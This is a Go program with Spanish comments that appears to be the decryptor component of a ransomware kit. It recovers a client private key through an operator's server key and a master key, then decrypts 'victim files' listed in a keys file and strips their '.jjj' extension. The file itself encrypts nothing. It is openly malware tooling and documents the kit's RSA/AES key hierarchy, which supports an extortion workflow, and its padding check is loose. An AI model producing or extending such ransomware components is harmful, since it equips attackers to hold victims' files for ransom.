// decryptor.go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
)

// Estructuras para almacenar la información de cifrado
type EncryptionInfo struct {
	Path string `json:"path"`
	Key  []byte `json:"key"` // Para master.key: ciphertext (IV || AES-cifrado de la clave privada del cliente).
	// Para archivos víctimas: ciphertext (IV || AES-cifrado del contenido original).
}

type EncryptionInfos []EncryptionInfo

var clientPrivateKey *rsa.PrivateKey // Se recupera de master.key
var eis EncryptionInfos

// decryptAES descifra datos cifrados con AES en CBC (se espera que encryptedData tenga el IV concatenado al inicio).
func decryptAES(encryptedData, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockSize := block.BlockSize()
	if len(encryptedData) < blockSize {
		return nil, fmt.Errorf("el tamaño del cifrado es menor que el tamaño del bloque")
	}
	iv := encryptedData[:blockSize]
	ciphertext := encryptedData[blockSize:]
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(ciphertext, ciphertext)
	return unpad(ciphertext)
}

// unpad remueve el padding PKCS7.
func unpad(data []byte) ([]byte, error) {
	length := len(data)
	if length == 0 {
		return nil, fmt.Errorf("datos vacíos")
	}
	padding := int(data[length-1])
	if padding > length {
		return nil, fmt.Errorf("padding inválido")
	}
	return data[:length-padding], nil
}

// loadKeys recupera la clave privada del cliente a partir de server.key, master.key y file.keys.
func loadKeys() {
	// 1. Leer y parsear server.key (clave privada del servidor)
	serverKeyData, err := os.ReadFile("server.key")
	if err != nil {
		log.Fatal("Error al leer server.key:", err)
	}
	serverPriv, err := x509.ParsePKCS1PrivateKey(serverKeyData)
	if err != nil {
		log.Fatal("Error al parsear server.key:", err)
	}

	// 2. Leer master.key, que contiene la RSA-encriptación de la clave simétrica (AES key)
	encryptedMaster, err := os.ReadFile("master.key")
	if err != nil {
		log.Fatal("Error al leer master.key:", err)
	}

	// 3. Desencriptar la clave simétrica usando la clave privada del servidor
	aesKey, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, serverPriv, encryptedMaster, nil)
	if err != nil {
		log.Fatal("Error al desencriptar master.key con serverPriv:", err)
	}

	// 4. Leer file.keys para obtener el ciphertext asociado a master.key
	keysData, err := os.ReadFile("file.keys")
	if err != nil {
		log.Fatal("Error al leer file.keys:", err)
	}
	var allKeys EncryptionInfos
	if err := json.Unmarshal(keysData, &allKeys); err != nil {
		log.Fatal("Error al parsear file.keys:", err)
	}
	var masterEntry *EncryptionInfo
	for _, entry := range allKeys {
		if entry.Path == "master.key" {
			masterEntry = &entry
			break
		}
	}
	if masterEntry == nil {
		log.Fatal("No se encontró la entrada para master.key en file.keys")
	}

	// 5. Desencriptar el ciphertext (que contiene IV || AES-cifrado) usando aesKey para obtener la clave privada del cliente
	clientPrivBytes, err := decryptAES(masterEntry.Key, aesKey)
	if err != nil {
		log.Fatal("Error al desencriptar la clave privada del cliente:", err)
	}

	// 6. Parsear la clave privada del cliente
	clientPrivateKey, err = x509.ParsePKCS1PrivateKey(clientPrivBytes)
	if err != nil {
		log.Fatal("Error al parsear la clave privada del cliente:", err)
	}
	fmt.Println("✅ Clave privada del cliente recuperada.")
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Uso: go run decryptor.go <ruta>")
		os.Exit(1)
	}
	ruta := os.Args[1]

	// Recuperar la clave privada del cliente.
	loadKeys()

	// Leer file.keys con la información de cifrado para cada archivo.
	keysData, err := os.ReadFile("file.keys")
	if err != nil {
		log.Fatal("Error al leer file.keys:", err)
	}
	if err := json.Unmarshal(keysData, &eis); err != nil {
		log.Fatal("Error al parsear file.keys:", err)
	}

	// Recorrer cada entrada (para archivos víctimas; se omite master.key)
	for _, info := range eis {
		if info.Path == "master.key" {
			continue
		}
		// Asegurarse de que el archivo pertenece a la ruta indicada.
		if !filepath.HasPrefix(info.Path, ruta) {
			continue
		}
		fmt.Println("Desencriptando:", info.Path)

		// Para archivos víctimas:
		// El contenido del archivo es la RSA-encriptación de la clave simétrica (ek).
		encryptedSymKey, err := os.ReadFile(info.Path)
		if err != nil {
			log.Println("Error al leer el archivo cifrado:", err)
			continue
		}

		// Desencriptar la clave simétrica usando la clave privada del cliente.
		aesKey, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, clientPrivateKey, encryptedSymKey, nil)
		if err != nil {
			log.Println("Error al desencriptar la clave AES para", info.Path, ":", err)
			continue
		}

		// Desencriptar el contenido real (almacenado en file.keys para ese archivo) usando aesKey.
		// Desencriptar el contenido real (almacenado en file.keys para ese archivo) usando aesKey.
decryptedData, err := decryptAES(info.Key, aesKey)
if err != nil {
    log.Println("Error al desencriptar el archivo", info.Path, ":", err)
    continue
}

// Remover la extensión ".jjj" para restaurar el nombre original
originalPath := info.Path
if strings.HasSuffix(originalPath, ".jjj") {
    originalPath = originalPath[:len(originalPath)-len(".jjj")]
}

if err := os.WriteFile(originalPath, decryptedData, 0666); err != nil {
    log.Println("Error al escribir el archivo desencriptado", originalPath, ":", err)
} else {
    fmt.Println("Archivo desencriptado:", originalPath)
}

	}
}
